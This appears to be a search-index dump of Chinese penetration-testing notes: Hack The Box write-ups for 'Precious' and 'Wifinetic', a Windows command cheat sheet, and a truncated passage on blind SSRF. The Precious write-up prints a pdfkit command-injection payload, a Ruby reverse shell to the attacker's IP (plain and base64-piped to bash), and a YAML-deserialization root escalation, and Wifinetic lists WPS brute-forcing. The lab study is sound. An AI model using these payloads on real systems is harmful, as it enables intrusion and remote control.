\u8bed\u8a00\u3002 \u5b83\u6258\u7ba1\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 Ruby Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u4f7f\u7528\u4e00\u4e2a\u8fc7\u65f6\u7684\u5e93\uff0c\u5373 <code>pdfkit</code>\uff0c\u5b83\u5bb9\u6613\u53d7\u5230 <code>CVE-2022-25765</code> \u7684\u653b\u51fb\uff0c\u5bfc\u81f4\u76ee\u6807\u673a\u5668\u4e0a\u7684\u521d\u59cb shell\u3002 \u5728\u4f7f\u7528\u5728 <code>Gem</code> \u5b58\u50a8\u5e93\u914d\u7f6e\u6587\u4ef6\u4e2d\u627e\u5230\u7684\u660e\u6587\u51ed\u636e\u8fdb\u884c\u900f\u89c6\u540e\uff0c\u8be5\u6846\u4ee5\u5bf9\u81ea\u5b9a\u4e49\u3001\u8fc7\u65f6\u7684 Ruby \u811a\u672c\u7684\u4e0d\u5b89\u5168\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7ed3\u675f\u3002</p>"},{"location":"HTB/Precious/#_2","title":"\u6240\u9700\u6280\u80fd","text":"<p>\u57fa\u672c\u7f51\u9875\u679a\u4e3e</p>"},{"location":"HTB/Precious/#_3","title":"\u5b66\u5230\u7684\u6280\u80fd","text":"<p>\u547d\u4ee4\u6ce8\u5165 \u5206\u6790\u548c\u8bc6\u522b\u6613\u53d7\u653b\u51fb\u7684 Ruby \u4ee3\u7801</p>"},{"location":"HTB/Precious/#_4","title":"\u679a\u4e3e","text":""},{"location":"HTB/Precious/#nmap","title":"Nmap","text":"<pre><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.189 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\nnmap -p$ports -sC -sV 10.10.11.189\n</code></pre> <p>\u521d\u59cb Nmap \u626b\u63cf\u663e\u793a\u6807\u51c6 SSH \u670d\u52a1\uff0c\u4ee5\u53ca\u5728\u5176\u9ed8\u8ba4\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684 Nginx Web \u670d\u52a1\u5668\uff0c\u540e\u8005\u4f3c\u4e4e\u6b63\u5728\u8fd0\u884c Phusion Passenger\uff0c\u5b83\u672c\u8eab\u5c31\u662f\u4e00\u4e2a Web \u670d\u52a1\u5668\uff0c\u65e8\u5728\u4e0e\u5176\u4ed6\u670d\u52a1\u96c6\u6210\uff0c\u4f8b\u5982 Apache\uff0c\u6216\u5728\u672c\u4f8b\u4e2d\u4e3a Nginx\u3002</p>"},{"location":"HTB/Precious/#http","title":"HTTP","text":"<p>\u5bfc\u822a\u5230\u7aef\u53e3 80 \u4f1a\u663e\u793a\u4e00\u4e2a Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u5b83\u4f3c\u4e4e\u53ef\u4ee5\u5c06\u7f51\u9875\u8f6c\u6362\u4e3a PDF\u3002</p> <p></p> <p>\u5f53\u4f7f\u7528\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u4eba\u5458\u63a7\u5236\u53f0\u6216 BurpSuite \u7b49\u4ee3\u7406\u5206\u6790\u8bf7\u6c42\u7684\u54cd\u5e94\u6807\u5934\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 <code>X-Runtime</code> \u6807\u5934\u88ab\u8bbe\u7f6e\u4e3a Ruby \uff0c\u8868\u660e Phusion Passenger \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6b63\u5728\u8fd0\u884c Ruby Web \u5e94\u7528\u7a0b\u5e8f\u3002</p> <p></p> <p>\u5728\u83b7\u5f97\u6709\u6548 URL \u540e\uff0c\u5e94\u7528\u7a0b\u5e8f\u83b7\u53d6\u5b83\u5e76\u7ee7\u7eed\u751f\u6210\u5177\u6709\u968f\u673a\u540d\u79f0\u7684 PDF\uff0c\u4f8b\u5982 <code>h2a0s6epa7r6phot1krfa646s4gk8gof.pdf</code> \u3002 \u6211\u4eec\u4f7f\u7528 <code>exiftool</code> \u5206\u6790\u6587\u6863\u7684 <code>Exif</code> \u5143\u6570\u636e\uff0c\u4ee5\u5bfb\u627e\u6709\u5173\u540e\u7aef\u53d1\u751f\u7684\u4e8b\u60c5\u7684\u4efb\u4f55\u6f5c\u5728\u7ebf\u7d22\u3002</p> <p></p> <p><code>Creator</code> \u6807\u7b7e\u8bbe\u7f6e\u4e3a <code>pdfkit v0.8.6</code> \uff0c\u8868\u793a\u8fd9\u662f\u751f\u6210\u6587\u4ef6\u7684\u5e93\u3002 \u5feb\u901f\u641c\u7d22\u540d\u79f0\u548c\u7248\u672c\u4f1a\u4ea7\u751f\u4e00\u4e2a\u516c\u5171\u5b58\u50a8\u5e93\uff0c\u968f\u540e\u4f1a\u4ea7\u751f\u4e00\u4e2a\u76f8\u5173\u7684\u5b89\u5168\u5efa\u8bae\uff0c\u5176\u4e2d\u5305\u62ec\u6709\u7528\u7684\u53c2\u8003\u8d44\u6599\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a <code>[PoC]()</code>\u3002 \u5f53\u5e93\u7684\u5b9e\u73b0\u5141\u8bb8\u7528\u6237\u8bbf\u95ee\u67e5\u8be2\u5b57\u7b26\u4e32\u53c2\u6570\u65f6\uff0c\u5c31\u4f1a\u51fa\u73b0\u6f0f\u6d1e\uff0c\u56e0\u4e3a\u968f\u540e\u53ef\u4ee5\u4f7f\u7528 shell \u547d\u4ee4\u66ff\u6362\u5b57\u7b26\u4e32\u6ce8\u5165\u4ee3\u7801\u3002</p> <p>\u9274\u4e8e\u6211\u4eec\u63d0\u4f9b\u7684 URL \u5f88\u53ef\u80fd\u662f\u901a\u8fc7\u8be5\u5e93\u4f20\u9012\u7684\uff0c\u6211\u4eec\u5c1d\u8bd5\u6587\u7ae0\u4e2d\u7684\u6709\u6548\u8d1f\u8f7d\uff1a</p> <p></p> <p>\u4f3c\u4e4e\u5728\u5e55\u540e\u53d1\u751f\u4e86\u66f4\u591a\u9a8c\u8bc1\uff0c\u6211\u4eec\u5fc5\u987b\u7ed5\u8fc7\u8fd9\u4e9b\u9a8c\u8bc1\u3002\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u8bed\u6cd5\u4e0a\u6709\u6548\u7684 URL \u7684\u6709\u6548\u8f7d\u8377\uff0c\u5176\u6709\u6548\u8f7d\u8377\u6307\u5411\u6211\u4eec\u4f7f\u7528 Python \u542f\u52a8\u7684\u7f51\u7edc\u670d\u52a1\u5668\u3002</p> <pre><code>http://test.local/%20`curl http://10.10.14.40/test`\n</code></pre> <p></p> <p>\u6211\u4eec\u6210\u529f\u5730\u5728\u6211\u4eec\u7684 HTTP \u670d\u52a1\u5668\u4e0a\u6536\u5230\u4e00\u4e2a\u56de\u8c03\uff0c\u9a8c\u8bc1\u6211\u4eec\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6709 RCE\u3002</p>"},{"location":"HTB/Precious/#_5","title":"\u7a81\u7834\u53e3","text":"<p>\u9274\u4e8e Web \u5e94\u7528\u7a0b\u5e8f\u7531 Ruby \u63d0\u4f9b\u652f\u6301\uff0c\u6211\u4eec\u4e5f\u5c06\u9009\u62e9 Ruby \u6709\u6548\u8d1f\u8f7d\uff0c\u5c3d\u7ba1 Bash \u5de5\u4f5c\u5f97\u540c\u6837\u597d\u3002 \u4f7f\u7528 revshells\uff0c\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u521b\u5efa\u81ea\u5b9a\u4e49\u6709\u6548\u8d1f\u8f7d\u5e76\u9009\u62e9\u7f16\u7801\uff1b \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c <code>Base64</code> \u3002</p> <pre><code>ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=&gt;TCPSocket.new(\"10.10.14.40\",4444))'\n</code></pre> <p>\u6211\u4eec\u5728\u7aef\u53e3 4444 \u4e0a\u542f\u52a8\u4e00\u4e2a Netcat \u4fa6\u542c\u5668\uff0c\u5e76\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u4e0a\u63d0\u4ea4\u6709\u6548\u8d1f\u8f7d.</p> <pre><code>http://test.local/%20`echo\ncnVieSAtcnNvY2tldCAtZSdzcGF3bigic2giLFs6aW4sOm91dCw6ZXJyXT0+VENQU29ja2V0Lm5ldygiMTAuMTA\nuMTQuNDAiLDQ0NDQpKSc= | base64 -d | bash`\n</code></pre> <p></p> <p>We successfully receive a shell as ruby .</p>"},{"location":"HTB/Precious/#_6","title":"\u6a2a\u5411\u79fb\u52a8","text":"<p>\u6211\u4eec\u4f7f\u7528 Python \u5c06 shell \u5347\u7ea7\u4e3a TTY shell</p> <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <p>\u679a\u4e3e\u6211\u4eec\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u4f1a\u663e\u793a\u4e00\u4e2a .bundle \u76ee\u5f55\uff0c\u8be5\u76ee\u5f55\u901a\u5e38\u6258\u7ba1 <code>Gem</code> \u548c\u5176\u4ed6 <code>Ruby</code> \u5b58\u50a8\u5e93\u4f7f\u7528\u7684\u914d\u7f6e\u6587\u4ef6\u3002</p> <p></p> <p>\u5728\u4e0a\u8ff0\u76ee\u5f55\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5176\u4e2d\u663e\u793a\u4e86 henry \u7528\u6237\u7684\u4e00\u4e9b\u7eaf\u6587\u672c\u51ed\u636e\u3002 \u6b64\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u5b58\u50a8\u6346\u7ed1\u5668\u9009\u9879\uff0c\u5141\u8bb8\u7528\u6237\u4fdd\u5b58\u6bcf\u4e2a Gem \u6e90\u7684\u51ed\u636e\u3002 \u91cd\u590d\u4f7f\u7528\u5bc6\u7801\u4ece\u6765\u90fd\u4e0d\u662f\u4e00\u4e2a\u597d\u4e3b\u610f\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u6cc4\u6f0f\u4f7f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 SSH \u8bbf\u95ee henry \u7528\u6237\u3002</p> <p></p> <p>\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e <code>henry:Q3c1AqGHtoI0aXAYFH</code> \u901a\u8fc7 SSH \u8fdb\u5165\u8be5\u6846\uff0c\u5e76\u5728 <code>/home/henry/user.txt</code> \u83b7\u53d6\u7528\u6237\u6807\u5fd7\u3002</p>"},{"location":"HTB/Precious/#_7","title":"\u6743\u9650\u63d0\u5347","text":"<p>\u679a\u4e3e\u76ee\u6807\u673a\u5668\u65f6\u8981\u91c7\u53d6\u7684\u9996\u8981\u6b65\u9aa4\u4e4b\u4e00\u662f\u68c0\u67e5\u7ed9\u5b9a\u7528\u6237\u7684\u6f5c\u5728 sudo \u6743\u9650\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fd9\u6837\u505a\u4f1a\u663e\u793a\u4e00\u4e2a Ruby \u811a\u672c\u7684 sudo \u6761\u76ee\u3002</p> <p></p> <p>\u6211\u4eec\u68c0\u67e5\u6e90\u4ee3\u7801\u4ee5\u4e86\u89e3\u6b64\u811a\u672c\u7684\u529f\u80fd\u3002</p> <pre><code># Compare installed dependencies with those specified in \"dependencies.yml\"\nrequire \"yaml\"\nrequire 'rubygems'\n# TODO: update versions automatically\ndef update_gems()\nend\ndef list_from_file\nYAML.load(File.read(\"dependencies.yml\"))\nend\n...\n</code></pre> <p>\u8be5\u811a\u672c\u8bfb\u53d6 <code>dependencies.yml</code> \u7684\u5185\u5bb9\uff0c\u7136\u540e\u68c0\u67e5\u6307\u5b9a\u7684\u7248\u672c\u662f\u5426\u4e0e\u7cfb\u7edf\u4e0a\u5168\u5c40\u5b89\u88c5\u7684\u7248\u672c\u76f8\u540c\u3002 \u8fd0\u884c\u811a\u672c\u63ed\u793a\u4e86\u4e00\u4e2a\u91cd\u8981\u4fe1\u606f\uff1a</p> <p></p> <p>\u6211\u4eec\u5728\u6e90\u7801\u4e2d\u4e5f\u53ef\u4ee5\u770b\u5230\uff0c<code>dependencies.yml</code>\u662f\u76f8\u5bf9\u5f15\u7528\u7684\uff0c\u4e5f\u5c31\u662f\u6ca1\u6709\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u7a0b\u5e8f\u6267\u884c\u7684\u65f6\u5019\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u5bfb\u627e\u6587\u4ef6\u3002 \u9274\u4e8e\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u9a8c\u8bc1\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u6211\u4eec\u5728\u8d1f\u8d23\u52a0\u8f7d\u6587\u4ef6\u7684 <code>YAML</code> \u6a21\u5757\u4e2d\u641c\u7d22\u6f5c\u5728\u6f0f\u6d1e\u3002</p> <p>\u67e5\u770b Ruby docs\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86\u6709\u5173\u901a\u8fc7 YAML \u52a0\u8f7d\u4e0d\u53d7\u4fe1\u4efb\u6570\u636e\u7684\u5b89\u5168\u9690\u60a3\u7684\u53c2\u8003\uff1a</p> <p>\u8be5\u6a21\u5757\u4e3a <code>YAML</code> \u683c\u5f0f\u7684\u6570\u636e\u5e8f\u5217\u5316\u63d0\u4f9b\u4e86\u4e00\u4e2a Ruby \u63a5\u53e3\u3002</p> <p>\u5b89\u5168\uff1a \u4e0d\u8981\u4f7f\u7528 YAML \u52a0\u8f7d\u4e0d\u53d7\u4fe1\u4efb\u7684\u6570\u636e\u3002 \u8fd9\u6837\u505a\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u5e76\u4e14\u53ef\u80fd\u5141\u8bb8\u6076\u610f\u8f93\u5165\u5728\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u8bf7\u53c2\u9605 doc/security.rdoc \u4e86\u89e3\u66f4\u591a\u4fe1\u606f\u3002</p> <p>\u641c\u7d22 Ruby \u53cd\u5e8f\u5217\u5316\u4f1a\u4ea7\u751f\u4e00\u4e2a\u6d41\u884c\u7684\u5b58\u50a8\u5e93\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u7cfb\u5217\u5bf9\u6211\u4eec\u7684\u5b9e\u8df5\u6709\u7528\u7684\u6709\u6548\u8d1f\u8f7d\uff1b\u5b83\u4eec\u90fd\u7ed1\u5b9a\u5230 2.0 \u548c 3.0 \u4e4b\u95f4\u7684\u7248\u672c\uff0c\u6240\u4ee5\u6211\u4eec\u9996\u5148\u68c0\u67e5\u76ee\u6807\u673a\u5668\u8fd0\u884c\u7684\u662f\u4ec0\u4e48\u7248\u672c\u3002</p> <p></p> <p>\u770b\u8d77\u6765\u8fd9\u4e2a\u7248\u672c\u5bb9\u6613\u53d7\u5230\u4e0a\u8ff0\u5b58\u50a8\u5e93\u4e2d\u540e\u4e00\u4e2a\u6709\u6548\u8d1f\u8f7d\u7684\u653b\u51fb\uff0c\u56e0\u6b64\u6211\u4eec\u5c06\u5176\u7c98\u8d34\u5230 <code>/tmp</code> \u76ee\u5f55\u4e2d\u7684 <code>dependencies.yml</code> \u6587\u4ef6\u4e2d.</p> <p></p> <p>\u8fd0\u884c\u811a\u672c\u9a8c\u8bc1\u4e86\u8fd9\u4e2a\u7406\u8bba\uff0c\u56e0\u4e3a id \u547d\u4ee4\u6210\u529f\u6267\u884c.</p> <p></p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5c06 <code>dependencies.yml</code> \u6587\u4ef6\u4e2d\u7684 <code>git_set</code> \u6807\u8bb0\u4ece <code>id</code> \u66f4\u6539\u4e3a\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\uff0c\u6765\u6ce8\u5165\u6211\u4eec\u6700\u521d\u7528\u4e8e\u83b7\u53d6 reverse shell \u4ee5\u83b7\u53d6 <code>root</code> shell \u7684\u76f8\u540c Ruby \u6709\u6548\u8f7d\u8377\u3002</p> <p></p> <p>\u6211\u4eec\u518d\u6b21\u5728\u7aef\u53e3 4444 \u4e0a\u8bbe\u7f6e\u76d1\u542c\u5668\uff0c\u5e76\u518d\u6b21\u8fd0\u884c\u811a\u672c.</p> <p></p> <p>\u6211\u4eec\u5f97\u5230\u4e00\u4e2a\u56de\u8c03\u5e76\u6210\u529f\u5730 root \u4e86\u76d2\u5b50\u3002\u6700\u7ec8\u6807\u5fd7\u53ef\u4ee5\u5728 <code>/root/root.txt</code> \u627e\u5230\u3002</p>"},{"location":"HTB/Tirck/","title":"Trick","text":""},{"location":"HTB/Wifinetic/","title":"Wifinetic","text":""},{"location":"HTB/Wifinetic/#_1","title":"\u6982\u8ff0","text":"<p>Wifinetic \u662f\u2f00\u6b3e\u7b80\u5355\u96be\u5ea6\u7684 Linux \u673a\u5668\uff0c\u5b83\u63d0\u51fa\u4e86\u6709\u8da3\u7684\u2f79\u7edc\u6311\u6218\uff0c\u4e13\u6ce8\u4e8e\u2f46\u7ebf\u5b89\u5168\u548c\u2f79\u7edc\u76d1\u63a7\u3002\u66b4\u9732\u7684 FTP \u670d\u52a1\u542f\u2f64\u4e86\u533f\u540d\u2f9d\u4efd\u9a8c\u8bc1\uff0c\u5141\u8bb8\u6211\u4eec\u4e0b\u8f7d\u53ef\u2f64\u2f42\u4ef6\u3002\u5176\u4e2d\u2f00\u4e2a\u2f42\u4ef6\u662fOpenWRT\u5907\u4efd\uff0c\u5176\u4e2d\u5305\u542b\u516c\u5f00\u63a5\u2f0a\u70b9\u5bc6\u7801\u7684\u2f46\u7ebf\u2f79\u7edc\u914d\u7f6e\u3002\u5f71\u2f26\u6216\u5bc6\u7801\u2f42\u4ef6\u7684\u5185\u5bb9\u8fdb\u2f00\u6b65\u6cc4\u9732\u4e86\u670d\u52a1\u5668\u4e0a\u7684\u2f64\u2f3e\u540d\u3002\u6709\u4e86\u8fd9\u4e9b\u4fe1\u606f\uff0c\u5c31\u53ef\u4ee5\u5bf9 SSH \u670d\u52a1\u8fdb\u2f8f\u5bc6\u7801\u91cd\u2f64\u653b\u51fb\uff0c\u4ece\u2f7d\u4f7f\u6211\u4eec\u80fd\u591f\u4ee5netadmin\u2f64\u2f3e\u7684\u2f9d\u4efd\u83b7\u5f97\u2f74\u2f9c\u70b9\u3002\u4f7f\u2f64\u6807\u51c6\u2f2f\u5177\u5e76\u5728\u76d1\u63a7\u6a21\u5f0f\u4e0b\u4f7f\u2f64\u63d0\u4f9b\u7684\u2f46\u7ebf\u63a5\u2f1d\uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u2f12\u7834\u89e3\u63a5\u2f0a\u70b9\u7684 WPS PIN \u4ee5\u83b7\u5f97\u9884\u5171\u4eab\u5bc6\u94a5 ( PSK )\u3002\u8be5\u5bc6\u7801\u53ef\u4ee5\u5728 SSH \u670d\u52a1\u4e0a\u91cd\u590d\u4f7f\u2f64\uff0c\u4ee5\u83b7\u5f97 root \u8bbf\u95ee\u6743\u9650\u3002</p>"},{"location":"HTB/Wifinetic/#_2","title":"\u6240\u9700\u77e5\u8bc6","text":"<ul> <li>\u679a\u4e3e</li> <li>Linux \u57fa\u7840\u77e5\u8bc6</li> <li>\u65e0\u7ebf\u7f51\u7edc\u57fa\u7840\u77e5\u8bc6</li> </ul>"},{"location":"HTB/Wifinetic/#_3","title":"\u5b66\u5230\u7684\u77e5\u8bc6","text":"<ul> <li>\u5bc6\u7801\u91cd\u7528</li> <li>WPS\u66b4\u529b\u7834\u89e3</li> </ul>"},{"location":"HTB/Wifinetic/#ftp-anonymous","title":"FTP anonymous \u767b\u5f55","text":"<p>get  backup-OpenWrt-2023-07-26.tar \u6587\u4ef6\uff0cconfig \u6587\u4ef6\u5939\u4e0b\u542b\u6709 wifi \u5bc6\u7801\u4e0e\u7528\u6237 netadmin \u5bc6\u7801\u91cd\u7528\u3002</p>"},{"location":"HTB/Wifinetic/#_4","title":"\u6743\u9650\u63d0\u5347","text":"<p>iwconfig </p> <p>\u57fa\u672c\u4fe1\u606f\uff1a\u63a5\u53e3\u6a21\u5f0f\u3001\u5173\u8054 AP BSSID\u3001</p> <p>iw dev</p> <p>\u66f4\u8be6\u7ec6\u7684\u4fe1\u606f</p> <p>getcap -r / 2&gt;/dev/null</p> <p>\u68c0\u67e5\u7f51\u7edc\u5de5\u5177\u5df2\u7ecf\u5b89\u88c5\u7684\u5de5\u5177\u5217\u8868</p> <p>wash -i wlan2</p> <p>\u679a\u4e3e\u7f51\u7edc\u4fe1\u606f</p> <p>reaver -i mon0 -b  -vv -c 1 <p>\u66b4\u529b\u7834\u89e3WPS PIN\uff0c\u5bc6\u7801\u4e0eroot\u5bc6\u7801\u91cd\u7528\u3002</p>"},{"location":"HTB/htb%E5%A4%87%E5%BF%98%E5%BD%95/","title":"Htb\u5907\u5fd8\u5f55","text":"<p>\u547d\u4ee4</p> <p>\u63cf\u8ff0</p> <p><code>xfreerdp /v:&lt;target IP address&gt; /u:htb-student /p:&lt;password&gt;</code></p> <p>RDP \u5230\u5b9e\u9a8c\u5ba4\u76ee\u6807</p> <p><code>Get-WmiObject -Class win32_OperatingSystem</code></p> <p>\u83b7\u53d6\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u7684\u4fe1\u606f</p> <p><code>dir c:\\ /a</code></p> <p>\u67e5\u770bc:\\\u6839\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55</p> <p><code>tree &lt;directory&gt;</code></p> <p>\u4ee5\u56fe\u5f62\u65b9\u5f0f\u663e\u793a\u8def\u5f84\u7684\u76ee\u5f55\u7ed3\u6784</p> <p><code>tree c:\\ /f | more</code></p> <p><code>tree</code>\u9010\u9875\u6d4f\u89c8\u547d\u4ee4\u7684\u7ed3\u679c</p> <p><code>icacls &lt;directory&gt;</code></p> <p>\u67e5\u770b\u5bf9\u76ee\u5f55\u8bbe\u7f6e\u7684\u6743\u9650</p> <p><code>icacls c:\\users /grant joe:f</code></p> <p>\u6388\u4e88\u7528\u6237\u5bf9\u76ee\u5f55\u7684\u5b8c\u5168\u6743\u9650</p> <p><code>icacls c:\\users /remove joe</code></p> <p>\u5220\u9664\u7528\u6237\u5bf9\u76ee\u5f55\u7684\u6743\u9650</p> <p><code>Get-Service</code></p> <p><code>PowerShell</code>cmdlet \u67e5\u770b\u6b63\u5728\u8fd0\u884c\u7684\u670d\u52a1</p> <p><code>help &lt;command&gt;</code></p> <p>\u663e\u793a\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\u83dc\u5355</p> <p><code>get-alias</code></p> <p>\u5217\u51fa<code>PowerShell</code>\u522b\u540d</p> <p><code>New-Alias -Name \"Show-Files\" Get-ChildItem</code></p> <p>\u521b\u5efa\u4e00\u4e2a\u65b0<code>PowerShell</code>\u522b\u540d</p> <p><code>Get-Module | select Name,ExportedCommands | fl</code></p> <p>\u67e5\u770b\u5bfc\u5165<code>PowerShell</code>\u7684\u6a21\u5757\u53ca\u5176\u76f8\u5173\u547d\u4ee4</p> <p><code>Get-ExecutionPolicy -List</code></p> <p>\u67e5\u770b<code>PowerShell</code>\u6267\u884c\u7b56\u7565</p> <p><code>Set-ExecutionPolicy Bypass -Scope Process</code></p> <p>\u5c06<code>PowerShell</code>\u6267\u884c\u7b56\u7565\u8bbe\u7f6e\u4e3a\u7ed5\u8fc7\u5f53\u524d\u4f1a\u8bdd</p> <p><code>wmic os list brief</code></p> <p>\u83b7\u53d6\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u7684\u4fe1\u606f<code>wmic</code></p> <p><code>Invoke-WmiMethod</code></p> <p><code>WMI</code>\u5bf9\u8c61\u7684\u8c03\u7528\u65b9\u6cd5</p> <p><code>whoami /user</code></p> <p>\u67e5\u770b\u5f53\u524d\u7528\u6237\u7684 SID</p> <p><code>reg query &lt;key&gt;</code></p> <p>\u67e5\u770b\u6709\u5173\u6ce8\u518c\u8868\u9879\u7684\u4fe1\u606f</p> <p><code>Get-MpComputerStatus</code></p> <p>\u68c0\u67e5<code>Defender</code>\u542f\u7528\u4e86\u54ea\u4e9b\u4fdd\u62a4\u8bbe\u7f6e</p> <p><code>sconfig</code></p> <p>Windows Server Core \u4e2d\u7684\u52a0\u8f7d\u670d\u52a1\u5668\u914d\u7f6e\u83dc\u5355</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E7%9B%B2SSRF/","title":"\u76f2SSRF","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E7%9B%B2SSRF/#_1","title":"\u539f\u7406","text":"<p>\u5f53\u53ef\u4ee5\u8bf1\u5bfc\u5e94\u7528\u7a0b\u5e8f\u5411\u63d0\u4f9b\u7684 URL \u53d1\u51fa\u540e\u7aef HTTP \u8bf7\u6c42\uff0c\u4f46\u540e\u7aef\u8bf7\u6c42\u7684\u54cd\u5e94\u672a\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u524d\u7aef\u54cd\u5e94\u4e2d\u8fd4\u56de\u65f6\uff0c\u5c31\u4f1a\u51fa\u73b0\u76f2 SSRF \u6f0f\u6d1e\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E7%9B%B2SSRF/#_2","title":"\u5f71\u54cd","text":"<p>\u76f2 SSRF \u6f0f\u6d1e\u7684\u5f71\u54cd\u901a\u5e38\u4f4e\u4e8e\u5b8c\u5168\u77e5\u60c5\u7684 SSRF \u6f0f\u6d1e\uff0c\u56e0\u4e3a\u5b83\u4eec\u5177\u6709\u5355\u5411\u6027\u3002\u4e0d\u80fd\u8f7b\u6613\u5229\u7528\u5b83\u4eec\u4ece\u540e\u7aef\u7cfb\u7edf\u68c0\u7d22\u654f\u611f\u6570\u636e\uff0c\u5c3d\u7ba1\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5229\u7528\u5b83\u4eec\u6765\u5b9e\u73b0\u5b8c\u6574\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E7%9B%B2SSRF/#_3","title":"\u6316\u6398\u53ca\u5229\u7528","text":"<p>\u68c0\u6d4b\u76f2 SSRF \u6f0f\u6d1e\u6700\u53ef\u9760\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u5e26\u5916 ( OAST ) \u6280\u672f\u3002\u8fd9\u6d89\u53ca\u5c1d\u8bd5\u5411\u60a8\u63a7\u5236\u7684\u5916\u90e8\u7cfb\u7edf\u89e6\u53d1 HTTP \u8bf7\u6c42\uff0c\u5e76\u76d1\u89c6\u4e0e\u8be5\u7cfb\u7edf\u7684\u7f51\u7edc\u4ea4\u4e92\u3002</p> <p>\u4f7f\u7528\u5e26\u5916\u6280\u672f\u6700\u7b80\u5355\u3001\u6700\u6709\u6548\u7684\u65b9\u6cd5\u662f\u4f7f\u7528Burp Collaborator\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528Burp Collaborator \u5ba2\u6237\u7aef\u751f\u6210\u552f\u4e00\u7684\u57df\u540d\uff0c\u5c06\u5b83\u4eec\u4ee5\u6709\u6548\u8d1f\u8f7d\u7684\u5f62\u5f0f\u53d1\u9001\u5230\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u76d1\u89c6\u4e0e\u8fd9\u4e9b\u57df\u7684\u4efb\u4f55\u4ea4\u4e92\u3002\u5982\u679c\u89c2\u5bdf\u5230\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684\u4f20\u5165 HTTP \u8bf7\u6c42\uff0c\u90a3\u4e48\u5b83\u5f88\u5bb9\u6613\u53d7\u5230 SSRF \u7684\u653b\u51fb\u3002</p> <p>\u5728\u6d4b\u8bd5 SSRF \u6f0f\u6d1e\u65f6\uff0c\u901a\u5e38\u4f1a\u89c2\u5bdf\u5230\u5bf9\u63d0\u4f9b\u7684 Collaborator \u57df\u7684 DNS \u67e5\u627e\uff0c\u4f46\u6ca1\u6709\u540e\u7eed\u7684 HTTP \u8bf7\u6c42\u3002\u8fd9\u901a\u5e38\u662f\u56e0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bd5\u56fe\u5411\u57df\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u8fd9\u5bfc\u81f4\u4e86\u521d\u59cb DNS \u67e5\u627e\uff0c\u4f46\u5b9e\u9645\u7684 HTTP \u8bf7\u6c42\u88ab\u7f51\u7edc\u7ea7\u8fc7\u6ee4\u963b\u6b62\u3002\u57fa\u7840\u8bbe\u65bd\u5141\u8bb8\u51fa\u7ad9 DNS \u6d41\u91cf\u662f\u76f8\u5bf9\u5e38\u89c1\u7684\uff0c\u56e0\u4e3a\u6709\u5f88\u591a\u76ee\u7684\u90fd\u9700\u8981\u8fd9\u6837\u505a\uff0c\u4f46\u4f1a\u963b\u6b62\u4e0e\u610f\u5916\u76ee\u7684\u5730\u7684 HTTP \u8fde\u63a5\u3002</p> <p>\u7b80\u5355\u5730\u8bc6\u522b\u53ef\u4ee5\u89e6\u53d1\u5e26\u5916 HTTP \u8bf7\u6c42\u7684\u76f2SSRF 